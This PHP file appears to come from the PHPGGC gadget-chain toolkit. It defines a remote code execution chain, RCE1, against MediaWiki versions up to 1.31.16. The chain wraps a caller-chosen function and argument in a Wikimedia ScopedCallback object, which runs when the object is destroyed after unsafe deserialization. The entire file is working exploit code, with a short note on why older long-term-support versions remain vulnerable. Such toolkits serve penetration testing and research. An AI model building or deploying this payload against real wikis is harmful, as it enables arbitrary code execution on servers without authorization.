<?php

namespace GadgetChain\MediaWiki;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '<= 1.31.16';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'Protection was added to ScopedCallback in:
    https://www.mediawiki.org/wiki/Release_notes/1.32 but 1.31 was an LTS that
    was supported until 2021. Early versions of the class did not accept params
    but could be used to call phpinfo(), for example.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Wikimedia\ScopedCallback($function, $parameter);
    }
}
